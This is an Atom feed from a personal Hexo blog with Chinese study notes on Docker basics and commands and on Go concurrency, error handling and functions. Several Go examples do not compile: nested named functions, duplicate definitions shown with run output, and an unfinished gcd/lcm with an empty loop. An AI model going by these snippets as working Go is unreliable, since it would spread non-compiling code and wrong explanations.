<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LexLady</title>
  
  
  <link href="http://lexlady.top/atom.xml" rel="self"/>
  
  <link href="http://lexlady.top/"/>
  <updated>2023-07-19T07:23:41.908Z</updated>
  <id>http://lexlady.top/</id>
  
  <author>
    <name>Lexlady</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker</title>
    <link href="http://lexlady.top/2023/07/18/docker/"/>
    <id>http://lexlady.top/2023/07/18/docker/</id>
    <published>2023-07-18T02:01:51.000Z</published>
    <updated>2023-07-19T07:23:41.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h1><p>解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术</p><p>Docker可以将软件的原生环境复制过来，消除了协作编码时 <em>“我的机器上可以正常工作”</em> 的问题</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Docker是基于GO的云开源项目，解决<strong>运行环境</strong>和<strong>配置问题</strong>的软件容器，方便做持续集成、整体发布的容器虚拟化技术。</p><h2 id="docker特点"><a href="#docker特点" class="headerlink" title="docker特点"></a>docker特点</h2><p>“Build， Ship and Run Any App， Anywhere”</p><p>通过对应用的封装、发布、部署、运行等生命周期的管理，使其能够做到“一次镜像，处处运行”</p><ul><li><p>安全可靠<br>  容器间的隔离不仅限于彼此，还独立于底层的基础设施。当应用出现问题时，不会波及到主机</p></li><li><p>资源利用率高<br>  容器拥有很高的兼容性，能够将应用直接迁移到另一个平台，提高了开发效率，减少了部署应用的工作量</p></li><li><p>标准开放<br>  容器基于开放式标准，能够在任何基础设施上运行。运输方式、存储方式、API接口隔离</p></li><li><p>轻量化<br>  容器的构建快速且使用更少的计算和内存，</p></li></ul><h2 id="架构与主要功能组件"><a href="#架构与主要功能组件" class="headerlink" title="架构与主要功能组件"></a>架构与主要功能组件</h2><p>docker整体采用C&#x2F;S模式，客户端主要负责发送操作指令，服务端负责接受和处理指令。客户端和服务端之间的通信方式多样</p><h3 id="功能组件"><a href="#功能组件" class="headerlink" title="功能组件"></a>功能组件</h3><ul><li>Docker客户端<br>  Docker客户端一般通过Docker command来发起请求</li><li>Docker服务器（Docker daemon）<br>  接受客户端发来的请求，并实现所要求的的功能，同时针对请求返回相应的结果。</li><li>Docker容器</li><li>Docker镜像<br>  镜像是一个只读的模板，用来创建相应的容器。</li><li>Docker仓库<br>  仓库是存放镜像的地方，类似于Maven，GitHub。docker提供的官方registry————Docker Hub。仓库可分为公开仓库和私有仓库</li></ul><h2 id="与传统虚拟机的对比"><a href="#与传统虚拟机的对比" class="headerlink" title="与传统虚拟机的对比"></a>与传统虚拟机的对比</h2><p>虚拟机（virtual machine），可以在一种操作系统里运行另一种操作系统。</p><p>传统虚拟机技术是通过在主操作系统上的虚拟管理系统（VMware、virtualBox）创建虚拟机（模拟各种硬件），安装操作系统，安装部署各种应用</p><ul><li>特点<ul><li>资源占用多</li><li>冗余步骤多</li><li>启动慢</li></ul></li></ul><p>Linux容器（Linux Containers，LXC）是与系统其他部分隔离开的一系列进程，容器不是模拟一个完整的操作系统而是对进程进行隔离，将软件运行所需的所有资源打包到一个隔离的容器中，因此在开发到测试再到生产的过程中，他都具有<strong>可移植性</strong>和<strong>一致性</strong>。<br>容器虚拟化技术不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置，整个过程更轻量，高效并保证在任何环境中能够运行</p><p>总结：容器是在操作系统层面上实现虚拟化，容器之间共享主机的操作系统，容器作为进程在主机上运行；而虚拟机是在硬件层面上实现虚拟化，有自己的操作系统且独立于主机操作系统。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Cgroup<br>对进程资源进行限制，对资源的使用进行追踪。</p><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>容器是镜像的运行实例，就如同Java语言中类与对象的关系。</p><p>容器是一个轻量级的沙箱子，可以被启动、开始、停止、删除，每个容器之间相互隔离，保证了平台的安全。</p><h1 id="docker常用指令"><a href="#docker常用指令" class="headerlink" title="docker常用指令"></a>docker常用指令</h1><h2 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h2><ul><li><p>docker run</p><p>  创建一个新的容器（并运行一个命令）</p><p>  <code>docker run [OPTIONS] IMAGE [COMMAND]</code></p><p>  常见参数：</p><ul><li>-d：后台运行容器，将返回容器ID</li><li>-i：以交互模式运行容器，常与-i一起使用</li><li>-P：随机端口映射，容器内部端口随机映射到主机的端口</li><li>-p：指定端口映射，格式<code>主机端口:容器端口</code></li><li>-t：为容器分配一个伪输入终端</li><li>–name：为容器指定一个名称</li><li>–net：指定容器的网络连接类型</li><li>–link：连接到另一个容器</li><li>–volume：绑定一个卷</li></ul></li><li><p>docker start&#x2F;stop&#x2F;restart</p><p>  start：启动一个或多个已被停止的容器</p><p>  stop：停止一个正在运行的容器</p><p>  restart：重启容器</p></li><li><p>docker kill</p><p>  杀掉一个运行中的容器</p></li><li><p>docker rm</p><p>  删除一个或多个容器</p></li><li><p>docker exec</p></li></ul><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><ul><li><p>docker ps</p></li><li><p>docker inspect</p><p>  获取容器&#x2F;镜像的元数据。</p></li><li><p>docker attach</p></li><li><p>docker</p></li></ul><h2 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h2><ul><li><p>docker image tag</p></li><li><p>docker image build </p><p>  根据Dockerfile文件构建新镜像，其中还有些常见的选项，简写为docker build</p><ul><li>-t，生成镜像的名字及标签，可以在一次构建中为一个镜像设置多个标签</li><li>-f，指定使用的Dockerfile文件</li></ul></li><li><p>docker image history</p><p>  可以查看指定镜像的创建历史</p></li><li><p>docker image save</p></li><li><p>docker image load</p></li></ul><h2 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h2><ul><li>docker commit</li><li>docker cp</li></ul><h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><ul><li>docker login&#x2F;logout</li><li>docker pull</li><li>docker push</li><li>docker search</li></ul><h2 id="info-version"><a href="#info-version" class="headerlink" title="info|version"></a>info|version</h2><ul><li>docekr info</li><li>docker version</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;docker简介&quot;&gt;&lt;a href=&quot;#docker简介&quot; class=&quot;headerlink&quot; title=&quot;docker简介&quot;&gt;&lt;/a&gt;docker简介&lt;/h1&gt;&lt;p&gt;解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>并发</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-complicated/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-complicated/</id>
    <published>2023-05-27T07:26:22.000Z</published>
    <updated>2023-07-27T02:47:18.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><p><code>Go</code>语言支持并发，我们只需要通过<code>go</code>关键字来开启<code>goroutine</code>即可。</p><p><code>goroutine</code>是轻量级线程，<code>goroutine</code>的调度是由<code>Golang</code>运行时进行管理的。</p><p>语法：<code>go 函数名()</code>开启一个新的<code>goroutine</code></p><p>同一个程序中的所有<code>goroutine</code>共享同一个地址空间。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;并发&quot;&gt;&lt;a href=&quot;#并发&quot; class=&quot;headerlink&quot; title=&quot;并发&quot;&gt;&lt;/a&gt;并发&lt;/h1&gt;&lt;p&gt;&lt;code&gt;Go&lt;/code&gt;语言支持并发，我们只需要通过&lt;code&gt;go&lt;/code&gt;关键字来开启&lt;code&gt;goroutine&lt;/cod</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>错误处理</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-error/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-error/</id>
    <published>2023-05-27T04:26:22.000Z</published>
    <updated>2023-07-27T02:47:31.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>Go 语言通过内置的错误接口提供了非常简单的错误处理机制。</p><p>error 类型是一个接口类型</p><p>介绍一下 panic 与 recover,一个用于主动抛出错误，一个用于捕获panic抛出的错误。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;错误处理&quot;&gt;&lt;a href=&quot;#错误处理&quot; class=&quot;headerlink&quot; title=&quot;错误处理&quot;&gt;&lt;/a&gt;错误处理&lt;/h1&gt;&lt;p&gt;Go 语言通过内置的错误接口提供了非常简单的错误处理机制。&lt;/p&gt;
&lt;p&gt;error 类型是一个接口类型&lt;/p&gt;
&lt;p&gt;介绍</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>函数</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-function/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-function/</id>
    <published>2023-05-27T03:26:22.000Z</published>
    <updated>2023-07-27T02:37:08.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>函数是基本的代码块，用于执行一个任务。</p><p><code>Go</code>语言最少有个<code>main()</code>函数。</p><p>你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。</p><p>函数声明告诉了编译器函数的<strong>名称</strong>，<strong>参数</strong>和<strong>返回类型</strong>。</p><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">function_name</span><span class="hljs-params">( [parameter list] )</span></span> [return_types] &#123;<br>    <span class="hljs-comment">//your code</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>func</code>：函数由<code>func</code>开始声明</li><li><code>function_name</code>：函数名称，参数列表和返回值类型构成了函数签名。</li><li><code>parameter list</code>：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。</li><li><code>return_types</code>：返回类型，函数返回一列值。<code>return_types</code> 是该列值的<strong>数据类型</strong>。有些功能不需要返回值，这种情况下 <code>return_types</code> 不是必须的。</li><li>函数体：函数定义的代码集合。</li></ul><h2 id="函数返回多个值"><a href="#函数返回多个值" class="headerlink" title="函数返回多个值"></a>函数返回多个值</h2><p>go语言可以返回多个值，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x, y <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) &#123;<br>   <span class="hljs-keyword">return</span> y, x<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a, b := swap(<span class="hljs-string">&quot;Google&quot;</span>, <span class="hljs-string">&quot;Runoob&quot;</span>)<br>   fmt.Println(a, b)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><p>函数如果使用参数，该变量可称为函数的形参。</p><p>调用函数，可以通过两种方式来传递参数：</p><ul><li>值传递：在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。</li><li>引用传递：指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">100</span><br>   <span class="hljs-keyword">var</span> b <span class="hljs-type">int</span>= <span class="hljs-number">200</span><br><br>   fmt.Printf(<span class="hljs-string">&quot;交换前，a 的值 : %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;交换前，b 的值 : %d\n&quot;</span>, b )<br><br>   swap(a, b)<br>   <br>   fmt.Printf(<span class="hljs-string">&quot;交换后 a 的值 : %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;交换后 b 的值 : %d\n&quot;</span>, b )<br><br>   swap(&amp;a, &amp;b)<br><br>   fmt.Printf(<span class="hljs-string">&quot;交换后 a 的值 : %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;交换后 b 的值 : %d\n&quot;</span>, b )<br>   <br>   <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x, y <span class="hljs-type">int</span>)</span></span> &#123;<br>      temp := x    <span class="hljs-comment">/* 保存 x 的值 */</span><br>      x = y      <span class="hljs-comment">/* 将 y 值赋给 x */</span><br>      y = temp    <span class="hljs-comment">/* 将 temp 值赋给 y */</span><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x *<span class="hljs-type">int</span>, y *<span class="hljs-type">int</span>)</span></span> &#123;<br>      <span class="hljs-keyword">var</span> temp <span class="hljs-type">int</span><br>      temp = *x    <span class="hljs-comment">/* 保存 x 地址上的值 */</span><br>      *x = *y      <span class="hljs-comment">/* 将 y 值赋给 x */</span><br>      *y = temp    <span class="hljs-comment">/* 将 temp 值赋给 y */</span><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数用法"><a href="#函数用法" class="headerlink" title="函数用法"></a>函数用法</h2><h3 id="作为实参"><a href="#作为实参" class="headerlink" title="作为实参"></a>作为实参</h3><p><code>Go</code>语言可以很灵活的创建函数，并作为另外一个函数的实参。</p><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main <br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span> <br><br><span class="hljs-comment">// 声明一个函数类型 </span><br><span class="hljs-keyword">type</span> cb <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123; <br>   testCallBack(<span class="hljs-number">1</span>, callBack)<span class="hljs-comment">//执行函数---testCallBack </span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testCallBack</span><span class="hljs-params">(x <span class="hljs-type">int</span>, f cb)</span></span> &#123;  <span class="hljs-comment">//定义了一个函数 testCallBack</span><br>    f(x)  <span class="hljs-comment">//由于传进来的是callBack函数，该函数执行需要传入一个int类型参数，因此传入x </span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">callBack</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123; <br>   fmt.Printf(<span class="hljs-string">&quot;我是回调，x：%d\n&quot;</span>, x) <br>   <span class="hljs-keyword">return</span> x <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是匿名函数，可在动态编程中使用</p><p>匿名函数是一个”内联”语句或表达式。</p><p>匿名函数的优越性：可以直接使用函数内的变量，不必申明。</p><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 闭包使用方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x1, x2 <span class="hljs-type">int</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)  &#123;<br>   i := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)&#123;<br>      i++<br>      <span class="hljs-keyword">return</span> i,x1+x2<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// 闭包带参数，闭包函数可不用写形参名称</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x1, x2 <span class="hljs-type">int</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x3 <span class="hljs-type">int</span>,x4 <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>   i := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x3 <span class="hljs-type">int</span>, x4 <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123; <br>      i++<br>      <span class="hljs-keyword">return</span> i,x1 + x2,x3 + x4<br>   &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>   add_func := add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">//作为一个加法函数，函数i为0</span><br>   fmt.Println(add_func())<br>   fmt.Println(add_func())<br>   fmt.Println(add_func())<br><br>   add_func1 := add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">//创建新的函数，add()方法被重新赋值</span><br>   fmt.Println(add_func1()) <span class="hljs-comment">//i是1</span><br>   fmt.Println(add_func()) <span class="hljs-comment">//尽管外面的函数销毁了，但是内部函数仍然存在，这个就是闭包</span><br>   fmt.Println(add_func1()) <span class="hljs-comment">//i是2</span><br><br>   add_func := add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>   fmt.Println(add_func(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<br>   fmt.Println(add_func(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>   fmt.Println(add_func(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>))<br>&#125;<br><br>运行结果：<br><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。</p><p>所有给定类型的方法属于该类型的方法集。</p><p>关于值和指针，如果想在方法中改变结构体类型的属性，需要对方法传递指针，体会如下对结构体类型改变的方法 changRadis() 和普通的函数 change() 中的指针操作:</p><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span>  <br>)<br><br><span class="hljs-comment">/* 定义结构体 */</span><br><span class="hljs-keyword">type</span> Circle <span class="hljs-keyword">struct</span> &#123;<br>   radius <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Circle)</span></span> getArea() <span class="hljs-type">float64</span>  &#123;<br>   <span class="hljs-keyword">return</span> c.radius * c.radius * <span class="hljs-number">3.14</span><br>&#125;<br><br><span class="hljs-comment">// 注意如果想要更改成功c的值，这里需要传指针</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Circle)</span></span> changeRadius(radius <span class="hljs-type">float64</span>)  &#123;<br>   c.radius = radius<br>&#125;<br>   <br><span class="hljs-comment">// 以下操作将不生效</span><br><span class="hljs-comment">// func (c Circle) changeRadius(radius float64)  &#123;</span><br><span class="hljs-comment">//   c.radius = radius</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// 引用类型要想改变值需要传指针</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change</span><span class="hljs-params">(c *Circle, radius <span class="hljs-type">float64</span>)</span></span>  &#123;<br>   c.radius = radius<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123; <br>   <span class="hljs-keyword">var</span> c Circle<br>   fmt.Println(c.radius) <span class="hljs-comment">// 0</span><br>   c.radius = <span class="hljs-number">10.00</span><br>   fmt.Println(c.getArea()) <span class="hljs-comment">// 314</span><br>   c.changeRadius(<span class="hljs-number">20</span>)<br>   fmt.Println(c.radius) <span class="hljs-comment">// 20</span><br>   change(&amp;c, <span class="hljs-number">30</span>)<br>   fmt.Println(c.radius) <span class="hljs-comment">// 30</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数实例"><a href="#函数实例" class="headerlink" title="函数实例"></a>函数实例</h2><p>返回m,n的最大公因数，最小公倍数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">gcd</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>   <span class="hljs-keyword">for</span> &#123;<br>      <br>      &#125;<br><br>    <span class="hljs-comment">//递归</span><br>    <span class="hljs-keyword">if</span> a &gt; b &#123;<br>val = b<br>tem = a<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val = a<br>tem = b<br>&#125;<br><span class="hljs-keyword">if</span> tem%val != <span class="hljs-number">0</span> &#123;<br>      val = gcd(val, tem-val)<br>&#125;<br><span class="hljs-keyword">return</span> val<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lcm</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>   <br>   &#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>Go</code>语言标准库提供了多种可动用的内置的函数。例如，len() 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度，如果传入的是数组，则返回数组中包含的元素个数。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;p&gt;函数是基本的代码块，用于执行一个任务。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Go&lt;/code&gt;语言最少有个&lt;code&gt;main()&lt;/code&gt;函数。</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>循环语句</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-loopStatement/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-loopStatement/</id>
    <published>2023-05-27T02:56:22.000Z</published>
    <updated>2023-07-27T02:35:20.771Z</updated>
    
